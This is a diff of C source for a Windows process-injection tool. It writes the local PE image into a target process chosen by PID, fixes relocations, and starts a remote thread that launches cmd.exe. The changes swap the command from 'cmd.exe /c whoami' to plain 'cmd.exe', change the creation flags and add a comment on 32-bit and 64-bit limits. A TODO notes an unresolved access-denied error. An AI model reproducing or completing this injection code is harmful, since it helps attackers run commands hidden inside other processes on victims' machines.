@@ -50,11 +50,11 @@ DWORD CommandStart(VOID)
 
 	BOOL status = CreateProcessW(
 		NULL,
-		L"C:\\Windows\\System32\\cmd.exe /c whoami",
+		L"C:\\Windows\\System32\\cmd.exe",
 		NULL,
 		NULL,
 		FALSE,
-		NORMAL_PRIORITY_CLASS,
+		0,
 		NULL,
 		NULL,
 		&startInfo,
@@ -133,6 +133,7 @@ typedef struct BASE_RELOCATION_ENTRY {
 /// 5. Write the local image into target space 
 /// 6. Start remote thread with the function plus proper offset 
 /// TODO: Fix the access denied error code on the starting of the remote thread. 
+/// note: Intermingling 32bit vs 64 bit is not supported on remote thread calls
 /// </summary>
 /// <param name="PID"></param>
 /// <returns></returns>
@@ -197,7 +198,11 @@ HANDLE InjectProc(DWORD PID)
 						targetProc,
 						NULL,
 						0,
-						(LPTHREAD_START_ROUTINE)((DWORD_PTR)CommandStart + ImageBaseOffset), NULL, 0, NULL);
+						(LPTHREAD_START_ROUTINE)((DWORD_PTR)CommandStart + ImageBaseOffset),
+						NULL, 
+						0, 
+						NULL
+					);
 					if (rThread == NULL)
 					{
 						printf("Last Error: %d\n", GetLastError());
@@ -219,8 +224,7 @@ DWORD main()
 	{
 		printf("NULL Thread\n");
 		return -1;
-	}
-		
+	}		
 	printf("Injected\n");
 	WaitForSingleObject(cmdThread, INFINITE);
 	printf("SHould have worked\n");
